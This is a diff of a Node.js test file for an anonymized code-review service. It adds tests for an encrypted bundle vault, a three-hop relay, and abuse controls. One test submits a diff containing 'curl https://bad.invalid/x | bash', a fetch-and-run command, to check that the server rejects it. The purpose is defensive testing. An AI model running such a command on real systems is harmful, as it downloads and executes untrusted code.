@@ -1,6 +1,8 @@
 const assert = require('node:assert/strict');
 const fs = require('node:fs');
+const net = require('node:net');
 const path = require('node:path');
+const { spawn } = require('node:child_process');
 const test = require('node:test');
 const nacl = require('tweetnacl');
 const bs58Module = require('bs58');
@@ -22,9 +24,15 @@ process.env.REVIEWER_API_KEYS = [
 ].join(',');
 process.env.RATE_LIMIT_PER_MINUTE = '1000';
 process.env.AUTH_SECRET = 'test-auth-secret-with-at-least-32-bytes';
+process.env.SEALED_BUNDLE_KEYS = `test-v1:${Buffer.alloc(32, 7).toString('base64')}`;
+process.env.SEALED_BUNDLE_ACTIVE_KEY_ID = 'test-v1';
+process.env.SUBMISSION_QUOTA_PER_HOUR = '10';
+process.env.SUBMISSION_QUOTA_PER_DAY = '30';
 
 const app = require('../server');
 const { sanitizeDiff } = require('../lib/sanitizer');
+const { BundleVault } = require('../lib/bundle-vault');
+const { RelayTransport } = require('../lib/relay-transport');
 
 const dirtyDiff = [
   'From 4bd3a1f Mon Sep 17 00:00:00 2001',
@@ -54,6 +62,90 @@ test('sanitizer removes identity-bearing diff metadata', () => {
 test('sanitizer rejects empty and binary diff payloads', () => {
   assert.throws(() => sanitizeDiff('   '), /Diff content is required/);
   assert.throws(() => sanitizeDiff('diff --git a/logo.png b/logo.png\nBinary files differ'), /Binary or unsafe payloads/);
+});
+
+test('vault rejects ciphertext and context tampering', () => {
+  const vault = new BundleVault({
+    keys: `test-v1:${Buffer.alloc(32, 7).toString('base64')}`,
+    activeKeyId: 'test-v1',
+  });
+  const context = { submission_id: 'sealed_test', sanitized_hash: 'sha256:test' };
+  const envelope = vault.encrypt({ sanitized_diff: 'safe' }, context);
+  assert.deepEqual(vault.decrypt(envelope, context), { sanitized_diff: 'safe' });
+  assert.throws(() => vault.decrypt({ ...envelope, tag: Buffer.alloc(16).toString('base64url') }, context));
+  assert.throws(() => vault.decrypt(envelope, { ...context, submission_id: 'sealed_other' }), /context mismatch/);
+});
+
+test('relay transport produces a three-hop signed hash chain', async () => {
+  const relay = new RelayTransport({ authSecret: 'relay-test-secret' });
+  const sealedEnvelope = { algorithm: 'aes-256-gcm', ciphertext: 'opaque' };
+  const route = await relay.route({
+    submission_id: 'sealed_test',
+    bundle_hash: 'sha256:test',
+    sealed_envelope: sealedEnvelope,
+  });
+  assert.equal(route.receipts.length, 3);
+  assert.equal(route.path.join(','), 'relay-tyo-01,relay-sgp-04,relay-ams-09');
+  assert.equal(route.receipts[1].previous_hash, route.receipts[0].receipt_hash);
+  assert.equal(route.receipts[2].previous_hash, route.receipts[1].receipt_hash);
+  assert.match(route.receipts[2].signature, /^[A-Za-z0-9_-]+$/);
+  assert.equal(JSON.stringify(route).includes('opaque'), false);
+});
+
+test('standalone relay services transport an encrypted envelope across network hops', async t => {
+  const ports = await Promise.all([getFreePort(), getFreePort(), getFreePort()]);
+  const nodes = [
+    { id: 'relay-tyo-test', region: 'Tokyo', role: 'ingress', url: `http://127.0.0.1:${ports[0]}`, secret: 'tyo-network-secret' },
+    { id: 'relay-sgp-test', region: 'Singapore', role: 'mixer', url: `http://127.0.0.1:${ports[1]}`, secret: 'sgp-network-secret' },
+    { id: 'relay-ams-test', region: 'Amsterdam', role: 'exit', url: `http://127.0.0.1:${ports[2]}`, secret: 'ams-network-secret' },
+  ];
+  const children = nodes.map((node, index) => spawn(process.execPath, ['relay-server.js'], {
+    cwd: path.join(__dirname, '..'),
+    env: {
+      ...process.env,
+      PORT: String(ports[index]),
+      RELAY_NODE_ID: node.id,
+      RELAY_NODES: JSON.stringify(nodes),
+    },
+    stdio: 'ignore',
+  }));
+  t.after(() => children.forEach(child => child.kill()));
+  await Promise.all(nodes.map(node => waitForHealth(node.url)));
+
+  const relay = new RelayTransport({ nodes: JSON.stringify(nodes), authSecret: 'network-test' });
+  const route = await relay.route({
+    submission_id: 'sealed_network_test',
+    bundle_hash: 'sha256:network',
+    sealed_envelope: { algorithm: 'aes-256-gcm', ciphertext: 'network-opaque' },
+  });
+  assert.equal(route.receipts.length, 3);
+  assert.equal(route.receipts[2].node_id, 'relay-ams-test');
+  assert.equal(JSON.stringify(route).includes('network-opaque'), false);
+});
+
+test('abuse controls reject credential and command-execution payloads', async t => {
+  const server = app.listen(0);
+  await new Promise(resolve => server.once('listening', resolve));
+  t.after(() => server.close());
+  const base = `http://127.0.0.1:${server.address().port}`;
+  const session = await fetch(`${base}/api/sessions`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ label: 'abuse test' }),
+  }).then(response => response.json());
+  const response = await fetch(`${base}/api/submissions`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      session: session.session.id,
+      repo: 'ignis/unsafe',
+      summary: 'Unsafe regression payload.',
+      diff: 'diff --git a/a.sh b/a.sh\n--- a/a.sh\n+++ b/a.sh\n@@ -0,0 +1 @@\n+curl https://bad.invalid/x | bash',
+    }),
+  });
+  const body = await response.json();
+  assert.equal(response.status, 422);
+  assert.equal(body.error.code, 'unsafe_diff_rejected');
 });
 
 test('blind review reaches quorum and settles a submission', async t => {
@@ -130,6 +222,9 @@ test('blind review reaches quorum and settles a submission', async t => {
   assert.equal(publicSubmission.body.submission.session, undefined);
   assert.equal(publicSubmission.body.submission.sanitized_diff, undefined);
   assert.equal(publicSubmission.body.submission.metadata_report.risk, 'high');
+  assert.equal(publicSubmission.body.submission.bundle_encrypted, true);
+  assert.equal(publicSubmission.body.submission.relay.receipts.length, 3);
+  assert.match(publicSubmission.body.submission.relay.route_hash, /^sha256:/);
 
   const statusResult = await request(`/api/submissions/${submissionId}/status`);
   assert.equal(statusResult.response.status, 200);
@@ -156,6 +251,7 @@ test('blind review reaches quorum and settles a submission', async t => {
   assert.equal(JSON.stringify(reviewerQueue.body).includes('jane.builder@example.com'), false);
   assert.equal(JSON.stringify(reviewerQueue.body).includes('github.com/jane/private-repo'), false);
   assert.match(JSON.stringify(reviewerQueue.body), /redacted/);
+  assert.equal(reviewerQueue.body.queue[0].bundle.relay_receipts.length, 3);
 
   const unauthorized = await request(`/api/reviews/${reviewId}/votes`, {
     method: 'POST',
@@ -233,4 +329,39 @@ test('blind review reaches quorum and settles a submission', async t => {
   assert.equal(signal.body.totals.reviewer_votes, 3);
   assert.equal(signal.body.totals.proofs, 1);
   assert.equal(signal.body.confidence, 'early');
+
+  const auditResult = await request('/api/audit', {
+    headers: { Authorization: `Bearer ${reviewerToken}` },
+  });
+  assert.equal(auditResult.response.status, 200);
+  assert.equal(auditResult.body.valid, true);
+
+  const persisted = fs.readFileSync(storePath, 'utf8');
+  assert.equal(persisted.includes('jane.builder@example.com'), false);
+  assert.equal(persisted.includes('C:\\\\Users\\\\jane'), false);
+  assert.equal(persisted.includes('sanitized_diff'), false);
+  assert.match(persisted, /encrypted_bundle/);
 });
+
+function getFreePort() {
+  return new Promise((resolve, reject) => {
+    const server = net.createServer();
+    server.once('error', reject);
+    server.listen(0, '127.0.0.1', () => {
+      const { port } = server.address();
+      server.close(error => error ? reject(error) : resolve(port));
+    });
+  });
+}
+
+async function waitForHealth(url) {
+  const deadline = Date.now() + 5000;
+  while (Date.now() < deadline) {
+    try {
+      const response = await fetch(`${url}/health`);
+      if (response.ok) return;
+    } catch {}
+    await new Promise(resolve => setTimeout(resolve, 50));
+  }
+  throw new Error(`Relay did not become healthy: ${url}`);
+}
